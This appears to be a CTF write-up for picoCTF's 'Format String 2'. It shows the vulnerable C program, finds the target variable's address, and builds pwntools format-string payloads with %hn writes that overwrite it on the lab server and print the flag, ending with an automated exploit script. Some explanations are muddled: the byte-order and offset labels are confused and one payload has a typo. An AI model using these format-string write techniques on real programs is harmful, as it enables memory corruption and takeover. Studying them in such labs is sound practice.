---
layout: post
title:  "Format String 2"
description: Writing and understanding a format string payload
date:   2024-08-27
tags: ["Pwn", "Programming", "Binary Search", "Medium"]
category: [CTF,N00bzCTF]
---

## Challenge Info
This program is not impressed by cheap parlor tricks like reading arbitrary data off the stack. To impress this program you must change data on the stack!

Download the binary [here](https://artifacts.picoctf.net/c_rhea/26/vuln).

Download the source [here](https://artifacts.picoctf.net/c_rhea/26/vuln.c).

Additional details will be available after launching your challenge instance.

![format string 2](/assets/img/formatstring-2/formatstring2.png)

hint 1: pwntools are very useful for this problem!

author: SKRUBLAWD

## Understanding vuln.c

The code for your convenience:
```c++

#include <stdio.h>

int sus = 0x21737573;

int main() {
  char buf[1024];
  char flag[64];


  printf("You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your input: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  if (sus == 0x67616c66) {
    printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");

    // Read in the flag
    FILE *fd = fopen("flag.txt", "r");
    fgets(flag, 64, fd);

    printf("%s", flag);
    fflush(stdout);
  }
  else {
    printf("sus = 0x%x\n", sus);
    printf("You can do better!\n");
    fflush(stdout);
  }

  return 0;
}
```

Below are the important parts summarized:

`int sus = 0x21737573;`
1. Global integer variable `sus` is initialized with the hex value `0x21737573`.
2. The value it's initialized with doesn't really matter, we're going to have to change it to get the flag anyways.

`if (sus == 0x67616c66), printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");`
1. Checks if `sus` is equal to `0x67616c66`
2. If `sus` *is* equal to `0x67616c66`, we get the flag

So all we need to do is change the variable `sus` to equal `0x67616c66`

## Finding sus's address

Before changing the `sus` variable, we need to understand where it's being stored. To find that, I decided to use obj, but realistically any decompiler can work. The command I ran was:
```
~/Downloads > objdump -t ./vuln | grep sus
0000000000404060 g     O .data	0000000000000004              sus

~/Downloads >
```
From this, we know that the memory address where `sus` is being stored is `0x404060` (the `0x` is there because all memory addresses start with this).

From here, I recalled the challenge's hint- that pwntools would be crucial to beating this.


## Experimenting

Firstly, we can try to read stack values:

```py
from pwn import *

r = remote('rhea.picoctf.net',61512)
r.sendline(b'%1$llx,%2$llx,%3$llx,%4$llx,%5$llx,%6$llx,WEAREHERE')
r.interactive()
```
- The numbers (1, 2, 3 ,4 ,5 ,6), specify the offset on the stack
- We use the `llx` modifier is so that we print 8 bytes rather than 4

After running this python script, we receive this output:

```
> python3 solve.py
[<] Opening connection to rhea.picoctf.net on port 61512: Trying 3.13[+] Opening connection to rhea.picoctf.net on port 61512: Done
[*] Switching to interactive mode
You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
Here's your input: 402075,0,7ab445893a00,0,10962b0,7ab4458e5af0,WEAREHERE
sus = 0x21737573
You can do better!
[*] Got EOF while reading in interactive
$
```
This doesn't give us anything though. If we put each individual hex through [Cyberchef](https://gchq.github.io/CyberChef/), it just returns gibberish.

From here, we can modify the specific offsets we want to read, instead of doing `%1$llx,%2$llx,%3$llx` and so forth, we can try to do `%17$llx,%18$llx,%19$llx` etc.

Now, our script looks like this:

```py
from pwn import *

r = remote('rhea.picoctf.net',64870)
r.sendline(b'%17$llx,%18$llx,%19$llx,WEAREHERE')
r.interactive()
```
- We read and print the value at the 17th, 18th, and 19th position (offset) ont he stack using the `llx` modifier, to ensure we read all 8 bytes, rather than 4
- `WEAREHERE` serves as a marker so that we can identify where our input is on the stack.

After running this, our output looks like this:
```
> python3 solve.py
[+] Opening connection to rhea.picoctf.net on port 64870: Done
[*] Switching to interactive mode
You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
Here's your input: 5245484552414557,7e1fb8cb0045,7e1fb8cbcf78,WEAREHERE
sus = 0x21737573
You can do better!
[*] Got EOF while reading in interactive
$
```

When we put this into Cyberchef, we notice that we've successfully located where we are in the stack.
![format string 2](/assets/img/formatstring-2/cyberchef.png)

## Writing to the stack

Now, what we can try to do is move to the address `0x404060` (the address where sus is located), and then `0x404060` (2 forward). This way we can try to write half a number at the time.

**Keep in mind**: the bytes in the memory are stored in little endian order. In little-endian systems, the least significant byte (LSB) of a multi-byte value is stored first (at the lowest memory address), and the most significant byte (MSB) is stored last (at the highest memory address). **This is why we're writing the addresses "backwards"**.

```py
from pwn import *

payload = b'%17$llx,%18$llx,%19$llx,%20$llx,%21$llx,%22$llx,\x60\x40\x40\x00\x00\x00\x00\x00\x62\x40\x40\x00\x00\x00\x00\x00WEAREHERE'

r = remote('rhea.picoctf.net',60978)
r.sendline(payload)
r.interactive()
```

Our output should look something like this:
```
> python3 solve.py
[+] Opening connection to rhea.picoctf.net on port 60978: Done
[*] Switching to interactive mode
You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
Here's your input: 2c786c6c24303225,2c786c6c24313225,2c786c6c24323225,404060,404062,5245484552414557,`@@
sus = 0x21737573
You can do better!
[*] Got EOF while reading in interactive
$
```
The `404060,404062` part indicates we were successful with moving to our desired part in the stack.

But remember: our goal isn't to just overwrite sus, it's to overwrite it to specifically `0x67616c66`. But because it's in little endian order, we need to write the first half, AKA the **low-order bytes**, `0x6761` and then the second half, AKA the **high-order bytes**, `6c66`. If we convert `0x6761` from hexadecimal to decimal, we get `26465`. Meaning we need to push a value of `26465` to get to `0x6761`. The script below accomplishes this.

```py
from pwn import *
r = remote('rhea.picoctf.net',57321)
s = r.recvuntil('say?')
r.sendline(b'%26464d,%20$hnx%,20$llx,%21$llx,%22$llx,\x60\x40\x40\x00\x00\x00\x00\x00\x62\x40\x40\x00\x00\x00\x00\x00WEAREHERE')
r.interactive()
```
Let's break down this script step-by-step:

`%26464d,` : This ensures our output string has 26465 characters (notice the `,` also counts as a character)

`%20$hn` : This specifier writes 2 bytes (half a word) to the memory address that's stored on the *20th* argument on the stack. We use the `%hn` modifier to ensure that we only modify the lower-order 2 bytes.

Our output:
```
sus = 0x67617573
You can do better!
[*] Got EOF while reading in interactive
$
[*] Interrupted
[*] Closed connection to rhea.picoctf.net port 57321
```
*Notice the first 4 numbers of sus has changed?*

Now we just need to write the high order bytes, `0x6c66`, which is `27750` when converted to decimal. Since we've already written `26465` for the low order bytes, we just need to write 1285 more characters:

```py
from pwn import *
r = remote('rhea.picoctf.net',55608)
s = r.recvuntil('say?')
r.sendline(b'%26464d,%20$hn%1281dAAAA%19$hnx,%22$llx,\x60\x40\x40\x00\x00\x00\x00\x00\x62\x40\x40\x00\x00\x00\x00\x00WEAREHERE')
r.interactive()
```
One final time, let's break this down:
- `1281d` - This specifies that 1281 characters should be printed
- `AAAA` - Placeholder padding (4 characters)
- `%19$hn` - Writes 2-byte value (or half-word) to the 19th stack. The `hn` modifier will write the high-order bytes.

Output:
```
I have NO clue how you did that, you must be a wizard. Here you go...
picoCTF{f0rm47_57r?_f0rm47_m3m_f43e6ccc}[*] Got EOF while reading in interactive
$
```
We have our flag!: `picoCTF{f0rm47_57r?_f0rm47_m3m_f43e6ccc}`



## Bonus: the automatic way
If you don't really care to learn how to manually execute a format string vulnerability, I've left a pwntools script below:

```py
from pwn import *

# use 'objdump -t ./vuln | grep sus' to find sus address
addr = 0x404060



host = 'rhea.picoctf.net'
port = 50181

p = remote(host, port)

# ELF object loads binary 'vuln' which is what we're exploiting
context.binary = ELF('./vuln')

# Create a function called 'send_payload', send a payload to the remote service and receive all data sent back from the remote service
def send_payload(payload):
    p = remote(host, port)
    p.sendline(payload)
    return p.recvall()

# Initializes a FmtStr object and analyzes the format string vulnerabilities
autofmt = FmtStr(send_payload)

# Sets the offset
offset = autofmt.offset

payload = fmtstr_payload(offset, {addr: 0x67616c66})

print(f"Payload: {payload}")

p.sendline(payload)

output = p.recvall()

print(output)
```
